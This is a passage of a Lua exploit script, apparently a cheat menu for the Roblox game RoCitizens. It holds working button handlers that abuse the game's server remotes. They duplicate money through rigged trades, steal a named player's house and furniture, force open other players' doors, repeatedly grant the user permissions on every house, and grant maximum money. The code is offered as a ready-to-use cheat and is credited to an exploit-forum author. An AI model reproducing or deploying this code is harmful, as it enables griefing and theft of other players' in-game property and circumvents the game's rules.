DonationExploit.MouseButton1Click:Connect(function()
	local Plrs = game:GetService("Players")
local MyPlr = Plrs.LocalPlayer
local MyMoney = MyPlr.Money
local MyMoneyVal = MyMoney.Value
local MoneyChange = MyPlr.ChangeMoney
local TradeCrap = workspace.CommunicationRelays.Interclient
local CurrentTrades = workspace.CurrentTrades

function DonateExploit(Plr)
  local Response, TradeId = TradeCrap.RequestTrade:InvokeServer(Plr.Name)
  if Response and Response == "Accept" then
    local Math = (2147483647 - Plr.Money.Value)
    TradeCrap.TradeStart:InvokeServer(Plr.Name, TradeId)
    TradeCrap.TradeUpdate:InvokeServer(TradeId, Math, "Money")
    repeat wait() until CurrentTrades:FindFirstChild(TradeId)
    repeat
      TradeCrap.TradeAccept:FireServer(TradeId)
      wait(1)
    until not CurrentTrades:FindFirstChild(TradeId)
  elseif Response == "Reject" then
    TradeCrap.SendMessage:InvokeServer("Declined trade? Fine I guess you don't want 2 billion dollars.", Plr.Name)
  end
end


local Hint = Instance.new("Hint", game:GetService("CoreGui"))
Hint.Text = ""
for _, v in next, Plrs:GetPlayers() do
  if v ~= MyPlr then
    Hint.Text = "Trade sent to " .. v.Name .. " waiting for response and for him/her to accept..."
    DonateExploit(v)
    Hint.Text = "Trade finished."
    wait(3)
  end
end

local math = MyMoneyVal - MyMoney.Value
MoneyChange:Fire(math)
Hint:Destroy()

end)

CopyHouse.Name = "CopyHouse"
CopyHouse.Parent = OtherFrame
CopyHouse.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
CopyHouse.BorderColor3 = Color3.new(0, 0, 0)
CopyHouse.Position = UDim2.new(0.052941177, 0, 0.394160599, 0)
CopyHouse.Size = UDim2.new(0, 67, 0, 17)
CopyHouse.Font = Enum.Font.SourceSans
CopyHouse.Text = "Copy House"
CopyHouse.TextColor3 = Color3.new(0, 0, 0)
CopyHouse.TextSize = 14
CopyHouse.MouseButton1Click:Connect(function()
	local Target = (PlayerNameBox.Text)
local Plrs = game:GetService("Players")
local MyPlr = Plrs.LocalPlayer

function FindPlayer(Str, Hint)
	local Plr = { }
	for _, v in pairs(Plrs:GetPlayers()) do
		if string.lower(string.sub(v.Name, 1, string.len(Str))) == string.lower(Str) then
			table.insert(Plr, v)
		end
	end
	if #Plr == 1 then
		return Plr[1]
	else
		Hint.Text = "PLAYER NOT FOUND. CHECK YOUR SPELLING YOU IDIOT."
		wait(5)
		Hint:Destroy()
		error("lalalalalalalalalalaalalalaalalallalalalallalalallalalalallalalalall")
	end
end

function FindHouse(Plr)
	local Properties = { }
	for _, v in next, workspace:GetChildren() do
		if v:IsA("Model") and v.Name == "Property" then
			table.insert(Properties, v:GetChildren())
		end
	end
	for _, v in next, Properties do
		local Find = v[1]:FindFirstChild("Owner")
		if Find then
			if Find.Value == Plr.Name then
				return v[1]
			end
		end
	end

	return nil
end

function FlipLightSwitches(House)
	local StaticAssets = House.StaticAssets
	for _, v in next, StaticAssets:GetDescendants() do
		if v.Name == "SwitchV2" then
			workspace.CommunicationRelays.Interaction.LightInteractV2:FireServer(v)
		end
	end
end

function BuildHouse(Str)
	local Building = true
	local Hint = Instance.new("Hint", game:GetService("CoreGui"))
	Hint.Text = "Stealing house... (This could take a while... and you might lag...)"
	local Plr = FindPlayer(Str, Hint)
	workspace.CommunicationRelays.Interclient.SendMessage:InvokeServer("I stole your house. To get it back: reset character, and spawn it in again. I'm Sowwy. :(", Plr.Name)
	local GetHouse = FindHouse(Plr)
	if GetHouse == nil then
		Hint.Text = "That player doesn't have a house!"
		wait(7)
		Hint:Destroy()
		return
	end
	MyPlr.Character.HumanoidRootPart.CFrame = CFrame.new(GetHouse.PrimaryPart.Position + Vector3.new(0, 5, 0))
	repeat wait() until GetHouse.StaticAssets:FindFirstChild("Furniture")
	local GetFurniture = GetHouse.StaticAssets:FindFirstChild("Furniture")
	local TempFurniture = Instance.new("Folder", MyPlr)
	TempFurniture.Name = "TempFurniture"
	local GetColors = GetHouse.AestheticChanger.UpdateRequested
	local Table = { }
	Table["HouseType"] = GetHouse.Name
	Table["Furniture"] = { }
	Table["Variables"] = { }
	for i, v in next, GetFurniture:GetChildren() do
		local Clo = v:clone()
		Clo.Parent = TempFurniture
	end
	for i, v in next, GetColors:GetChildren() do
		Table["Variables"][v.Name] = v.Value
	end

	workspace.CommunicationRelays.House.ResetProperty:FireServer(GetHouse)
	workspace.CommunicationRelays.HomePurchase.House:InvokeServer(GetHouse.Parent, Table)

	GetHouse = FindHouse(MyPlr)
	for i, v in next, TempFurniture:GetChildren() do
		Hint.Text = "Stealing house... placing furniture " .. i .. "/" .. #TempFurniture:GetChildren()
		local Item = v:FindFirstChild("Item")
		local Color = v:FindFirstChild("Color")
		if Item and Color then
			local test = workspace.CommunicationRelays.House.PlaceFurniture:InvokeServer(v.Name, v.PrimaryPart.CFrame, GetHouse, Item.Value, Color.Value)
			if v.Name == "SS_Wooden Sign" then
				workspace.CommunicationRelays.Interaction.EditSign:FireServer(test, v.Plaque.SurfaceGui.TextLabel.Text)
			end
		else
			local Color1 = v:FindFirstChild("Color1")
			local Color2 = v:FindFirstChild("Color2")
			local Display = v:FindFirstChild("Display")
			if Color1 and Color2 and Display then
				workspace.CommunicationRelays.House.PlaceFurniture:InvokeServer(v.Name, v.PrimaryPart.CFrame, GetHouse, Item.Value, {["Display"] = Display.Value, ["Color1"] = Color1.Value, ["Color2"] = Color2.Value})
			end
		end
		game:GetService("RunService").RenderStepped:wait()
	end

	TempFurniture:Destroy()

	MyPlr.PlayerGui.Main.MyHouse.Value = GetHouse

	FlipLightSwitches(GetHouse)
	Building = false

	Hint.Text = "House copied, and spawned. Place some furniture to save it to server."
	wait(10)
	Hint.Text = "Made by @FalconPunch from v3rmillion."
	wait(3)
	Hint:Destroy()

	return Table
end

BuildHouse(Target)
end)

OpenDoors.Name = "OpenDoors"
OpenDoors.Parent = OtherFrame
OpenDoors.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
OpenDoors.BorderColor3 = Color3.new(0, 0, 0)
OpenDoors.Position = UDim2.new(0.558823586, 0, 0.39713791, 0)
OpenDoors.Size = UDim2.new(0, 67, 0, 17)
OpenDoors.Font = Enum.Font.SourceSans
OpenDoors.Text = "Open Doors"
OpenDoors.TextColor3 = Color3.new(0, 0, 0)
OpenDoors.TextSize = 14
OpenDoors.MouseButton1Click:Connect(function()
	local Plrs = game:GetService("Players")
local MyPlr = Plrs.LocalPlayer

function FindHouse(Plr)
	local Properties = { }
	for _, v in next, workspace:GetChildren() do
		if v:IsA("Model") and v.Name == "Property" then
			table.insert(Properties, v:GetChildren())
		end
	end
	for _, v in next, Properties do
		local Find = v[1]:FindFirstChild("Owner")
		if Find then
			if Find.Value == Plr.Name then
				return v[1]
			end
		end
	end

	return nil
	
end

function OpenDoors(House)
	local GetAssets = House.StaticAssets
	for _, v in next, GetAssets:GetDescendants() do
		if v.Name == "Door" or v.Name == "GlassDoor" then
			workspace.CommunicationRelays.Interaction.DoorInteract:FireServer(v)
		end
	end
end

function Main(Plr)
	local GetHouse = FindHouse(Plr)
    if GetHouse ~= nil then
        OpenDoors(GetHouse)
    end
end

for _, v in next, Plrs:GetPlayers() do
	Main(v)
end
end)

FlipSwitches.Name = "FlipSwitches"
FlipSwitches.Parent = OtherFrame
FlipSwitches.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
FlipSwitches.BorderColor3 = Color3.new(0, 0, 0)
FlipSwitches.Position = UDim2.new(0.558823586, 0, 0.554744542, 0)
FlipSwitches.Size = UDim2.new(0, 67, 0, 17)
FlipSwitches.Font = Enum.Font.SourceSans
FlipSwitches.Text = "-- Broken --"
FlipSwitches.TextColor3 = Color3.new(0, 0, 0)
FlipSwitches.TextSize = 13

HousePerms.Name = "HousePerms"
HousePerms.Parent = OtherFrame
HousePerms.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
HousePerms.BorderColor3 = Color3.new(0, 0, 0)
HousePerms.Position = UDim2.new(0.0529412031, 0, 0.554744542, 0)
HousePerms.Size = UDim2.new(0, 67, 0, 17)
HousePerms.Font = Enum.Font.SourceSans
HousePerms.Text = "House Perms"
HousePerms.TextColor3 = Color3.new(0, 0, 0)
HousePerms.TextSize = 13
HousePerms.MouseButton1Click:Connect(function()
	function GenerateTable(Plr)
local Tab = { }
for _, v in next, game:GetService("Players"):GetPlayers() do
if v ~= Plr and v ~= game:GetService("Players").LocalPlayer then
Tab[v.Name] = {["Ban"] = false, ["Paint"] = false, ["Door"] = false}
elseif v ~= Plr and v == game:GetService("Players").LocalPlayer then
Tab[v.Name] = {["Ban"] = false, ["Paint"] = true, ["Door"] = true}
end
end
return Tab
end

function GetHouse(Plr)
local Properties = { }
for _, v in next, workspace:GetChildren() do
if v:IsA("Model") and v.Name == "Property" then
table.insert(Properties, v:GetChildren())
end
end
for _, v in next, Properties do
local Find = v[1]:FindFirstChild("Owner")
if Find then
if Find.Value == Plr.Name then
return v[1]
end
end
end
end


while true do
for _, v in next, game:GetService("Players"):GetPlayers() do
if v ~= game:GetService("Players").LocalPlayer then
local House = GetHouse(v)
if House then
workspace.CommunicationRelays.House.SetPermissions:FireServer(GenerateTable(v), House)
end
end
end
wait(10)
end
end)

Goto.Name = "Goto"
Goto.Parent = OtherFrame
Goto.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
Goto.BorderColor3 = Color3.new(0, 0, 0)
Goto.Position = UDim2.new(0.558823586, 0, 0.722627759, 0)
Goto.Size = UDim2.new(0, 67, 0, 17)
Goto.Font = Enum.Font.SourceSans
Goto.Text = "Goto"
Goto.TextColor3 = Color3.new(0, 0, 0)
Goto.TextSize = 14
Goto.MouseButton1Click:Connect(function()
	getplr = function(plxr)
	for i, v in pairs(game.Players:GetPlayers()) do
		if string.find(v.Name, plxr) then
			return v
		elseif v.Name:sub(1, plxr:len()):lower()== plxr:lower() then
			return v
		end
	end
end
local plr = getplr(PlayerNameBox.Text)
	game.Players.LocalPlayer.Character:MoveTo(plr.Character.Torso.Position)
end)

MoneyGiver.Name = "MoneyGiver"
MoneyGiver.Parent = OtherFrame
MoneyGiver.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
MoneyGiver.BorderColor3 = Color3.new(0, 0, 0)
MoneyGiver.Position = UDim2.new(0.0529412031, 0, 0.722627759, 0)
MoneyGiver.Size = UDim2.new(0, 67, 0, 17)
MoneyGiver.Font = Enum.Font.SourceSans
MoneyGiver.Text = "Money Giver"
MoneyGiver.TextColor3 = Color3.new(0, 0, 0)
MoneyGiver.TextSize = 14
MoneyGiver.MouseButton1Click:Connect(function()
game.Players.LocalPlayer.ChangeMoney:Fire(2000000000)
end)

DonationHelp.Name = "DonationHelp"
DonationHelp.Parent = OtherFrame
DonationHelp.BackgroundColor3 = Color3.new(0.639216, 0.639216, 0.639216)
DonationHelp.BorderColor3 = Color3.new(0, 0, 0)
DonationHelp.Position = UDim2.new(0.441176474, 0, 0.883211672, 0)
DonationHelp.Size = UDim2.new(0, 21, 0, 16)
DonationHelp.Font = Enum.Font.SourceSans
DonationHelp.Text = "?"
DonationHelp.TextColor3 = Color3.new(0, 0, 0)
DonationHelp.TextSize = 14
DonationHelp.MouseButton1Click:Connect(function()

    if HelpFrame.Visible == false then
        HelpFrame.Visible = true
    else
        HelpFrame.Visible = false
    end

end)

HelpFrame.Name = "HelpFrame"
HelpFrame.Parent = RoCitizensGUI
HelpFrame.BackgroundColor3 = Color3.new(0.368627, 0.368627, 0.368627)
HelpFrame.BorderColor3 = Color3.new(0, 0, 0)
HelpFrame.Position = UDim2.new(0.112933457, 0, 0.412790716, 0)
HelpFrame.Size = UDim2.new(0, 222, 0, 163)
HelpFrame.Active = true
HelpFrame.Draggable = true
HelpFrame.Visible = false

RequiresPlrname.Name = "RequiresPlrname"
RequiresPlrname.Parent = HelpFrame
RequiresPlrname.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
RequiresPlrname.BorderColor3 = Color3.new(0, 0, 0)
RequiresPlrname.Position = UDim2.new(0.0495495498, 0, 0.036809817, 0)
RequiresPlrname.Size = UDim2.new(0, 200, 0, 66)
RequiresPlrname.Font = Enum.Font.SourceSans
RequiresPlrname.Text = "Buttons that require a player name input: Destroy house, Copy House, Goto. These buttons will not work without a player name in the textbox."
RequiresPlrname.TextColor3 = Color3.new(0, 0, 0)
RequiresPlrname.TextScaled = true
RequiresPlrname.TextSize = 14
RequiresPlrname.TextWrapped = true

MoneyExplain.Name = "MoneyExplain"
MoneyExplain.Parent = HelpFrame
MoneyExplain.BackgroundColor3 = Color3.new(0.494118, 0.494118, 0.494118)
MoneyExplain.BorderColor3 = Color3.new(0, 0, 0)
MoneyExplain.Position = UDim2.new(0.0495495796, 0, 0.496932507, 0)
MoneyExplain.Size = UDim2.new(0, 200, 0, 72)
MoneyExplain.Font = Enum.Font.SourceSans
MoneyExplain.Text = "The donation button will make you request a trade from every player. If they accept, they get $2 Billion. You lose NO money from this.  |  The Money giver grants you max money"
MoneyExplain.TextColor3 = Color3.new(0, 0, 0)
MoneyExplain.TextScaled = true
MoneyExplain.TextSize = 14
MoneyExplain.TextWrapped = true